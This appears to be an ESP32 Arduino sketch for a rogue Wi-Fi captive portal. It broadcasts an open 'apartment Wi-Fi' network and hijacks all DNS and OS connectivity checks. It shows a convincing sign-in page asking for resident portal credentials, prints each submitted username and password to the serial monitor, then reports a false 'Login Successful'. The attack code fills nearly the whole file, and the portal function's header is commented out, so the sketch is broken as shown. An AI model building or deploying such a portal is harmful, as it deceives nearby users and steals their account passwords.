#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* AP_SSID = "Fake Wifi for Apartment";
const byte DNS_PORT = 53;

IPAddress apIP(192,168,4,1);
IPAddress netMsk(255,255,255,0);

DNSServer dnsServer;
WebServer server(80);

// String portalPage() {
  return R"HTML(
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>This Is Fake Wifi Apartments Wifi — Sign In</title>
  <style>
    :root {
      --bg: #0b1020;
      --card: rgba(255, 255, 255, 0.08);
      --card2: rgba(255, 255, 255, 0.06);
      --text: rgba(255,255,255,0.92);
      --muted: rgba(255,255,255,0.65);
      --border: rgba(255,255,255,0.14);
      --accent: #7c5cff;
      --accent2: #00d4ff;
      --shadow: 0 18px 60px rgba(0,0,0,0.55);
      --radius: 18px;
    }

    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
      background: radial-gradient(1200px 700px at 20% 20%, rgba(124,92,255,0.25), transparent 60%),
                  radial-gradient(900px 600px at 90% 30%, rgba(0,212,255,0.18), transparent 55%),
                  linear-gradient(180deg, #060913, var(--bg));
      color: var(--text);
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 28px 16px;
    }

    .wrap {
      width: 100%;
      max-width: 920px;
      display: grid;
      grid-template-columns: 1.05fr 0.95fr;
      gap: 18px;
      align-items: stretch;
    }

    @media (max-width: 860px) {
      .wrap { grid-template-columns: 1fr; }
    }

    .hero, .card {
      border: 1px solid var(--border);
      border-radius: var(--radius);
      background: linear-gradient(180deg, var(--card), var(--card2));
      box-shadow: var(--shadow);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      overflow: hidden;
    }

    .hero {
      padding: 26px 26px 22px;
      position: relative;
    }

    .badge {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 8px 12px;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: rgba(0,0,0,0.18);
      font-size: 13px;
      color: var(--muted);
      width: fit-content;
    }

    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: radial-gradient(circle at 30% 30%, var(--accent2), var(--accent));
      box-shadow: 0 0 16px rgba(124,92,255,0.7);
    }

    h1 {
      margin: 16px 0 10px;
      font-size: 34px;
      line-height: 1.12;
      letter-spacing: -0.02em;
    }

    .sub {
      margin: 0 0 18px;
      color: var(--muted);
      max-width: 52ch;
      line-height: 1.55;
    }

    .pill-row {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 16px;
    }

    .pill {
      padding: 10px 12px;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: rgba(255,255,255,0.05);
      color: var(--muted);
      font-size: 13px;
    }

    .card {
      padding: 22px;
      display: grid;
      align-content: start;
      gap: 14px;
    }

    .card h2 {
      margin: 0;
      font-size: 18px;
      letter-spacing: -0.01em;
    }

    .hint {
      margin: 0 0 4px;
      color: var(--muted);
      font-size: 13px;
      line-height: 1.4;
    }

    form {
      display: grid;
      gap: 12px;
      margin-top: 6px;
    }

    label {
      display: block;
      font-size: 13px;
      color: var(--muted);
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 12px 12px;
      border-radius: 12px;
      border: 1px solid var(--border);
      background: rgba(0,0,0,0.22);
      color: var(--text);
      outline: none;
      transition: border-color .15s ease, box-shadow .15s ease, transform .05s ease;
    }

    input:focus {
      border-color: rgba(124,92,255,0.75);
      box-shadow: 0 0 0 4px rgba(124,92,255,0.18);
    }

    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 10px;
      flex-wrap: wrap;
      margin-top: 6px;
    }

    .check {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      color: var(--muted);
      font-size: 13px;
      user-select: none;
    }

    .check input {
      width: 16px;
      height: 16px;
      margin: 0;
      padding: 0;
      box-shadow: none;
    }

    button {
      width: 100%;
      padding: 12px 14px;
      border-radius: 12px;
      border: 0;
      cursor: pointer;
      font-weight: 650;
      color: white;
      background: linear-gradient(90deg, var(--accent), var(--accent2));
      box-shadow: 0 14px 30px rgba(0, 212, 255, 0.12);
      transition: transform .06s ease, filter .15s ease;
    }
    button:active { transform: translateY(1px); }
    button:hover { filter: brightness(1.05); }

    .fineprint {
      margin: 10px 0 0;
      color: rgba(255,255,255,0.55);
      font-size: 12px;
      line-height: 1.45;
    }

    .links {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
      margin-top: 4px;
    }
    .links a {
      color: rgba(255,255,255,0.72);
      font-size: 13px;
      text-decoration: none;
      border-bottom: 1px dashed rgba(255,255,255,0.28);
    }
    .links a:hover { color: rgba(255,255,255,0.92); }

    .footer {
      margin-top: 10px;
      color: rgba(255,255,255,0.55);
      font-size: 12px;
      text-align: center;
    }
  </style>
</head>

<body>
  <div class="wrap">
    <!-- Left / Brand panel -->
    <section class="hero" aria-label="Network information">
      <div class="badge">
        <span class="dot" aria-hidden="true"></span>
        Secure Portal • This Is Fake Wifi Apartments Wifi
      </div>

      <h1>Welcome to<br>This Is Fake Wifi Apartments Wifi</h1>
      <p class="sub">
        Sign in to connect. If you just moved in and nothing works, congratulations:
        you're now part of apartment living's oldest tradition.
      </p>

      <div class="pill-row" aria-label="Features">
        <div class="pill">Fast reconnect</div>
        <div class="pill">Device-friendly</div>
        <div class="pill">Encrypted login</div>
        <div class="pill">24/7 access</div>
      </div>
    </section>

    <!-- Right / Login card -->
    <section class="card" aria-label="Sign in form">
      <div>
        <h2>Sign in</h2>
        <p class="hint">Use your resident portal credentials to get online.</p>
      </div>

      <form action="/login" method="POST">
        <div>
          <label for="username">Username:</label>
          <input type="text" id="username" name="username" required autocomplete="username" />
        </div>

        <div>
          <label for="password">Password:</label>
          <input type="password" id="password" name="password" required autocomplete="current-password" />
        </div>

        <div class="row">
          <label class="check">
            <input type="checkbox" name="remember" />
            Remember me
          </label>

          <div class="links">
            <a href="/forgot">Forgot password?</a>
            <a href="/help">Help</a>
          </div>
        </div>

        <button type="submit">Connect</button>

        <p class="fineprint">
          By signing in, you agree to the acceptable use policy. Don't do weird stuff.
          (Or at least don't do it on the building Wi-Fi.)
        </p>
      </form>

      <div class="footer">© This Is Fake Wifi Apartments • Wifi Access Portal</div>
    </section>
  </div>
</body>
</html>
)HTML";
}

void redirectToRoot() {
  server.sendHeader("Location", String("http://") + apIP.toString() + "/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID);

  // DNS: resolve ANY domain to the ESP32 AP IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Main portal
  server.on("/", HTTP_GET, []() {
    server.send(200, "text/html", portalPage());
  });

  // Handle login form submission
  server.on("/login", HTTP_POST, []() {
    String username = server.arg("username");  // Get the username from the form
    String password = server.arg("password");  // Get the password from the form

    // Log the username and password to Serial Monitor
    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Password: ");
    Serial.println(password);

    // Respond to the user
    server.send(200, "text/html",
      "<html><body><h3>✅ Login Successful</h3><p>You can close this window.</p></body></html>");
  });

  // iOS / macOS captive checks
  server.on("/hotspot-detect.html", HTTP_GET, redirectToRoot);     
  server.on("/library/test/success.html", HTTP_GET, redirectToRoot); 

  // Android / ChromeOS checks
  server.on("/generate_204", HTTP_GET, redirectToRoot);            

  // Catch-all: anything else -> portal
  server.onNotFound(redirectToRoot);

  server.begin();

  Serial.println("Captive portal running.");
  Serial.print("AP SSID: "); Serial.println(AP_SSID);
  Serial.print("Portal IP: "); Serial.println(apIP);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}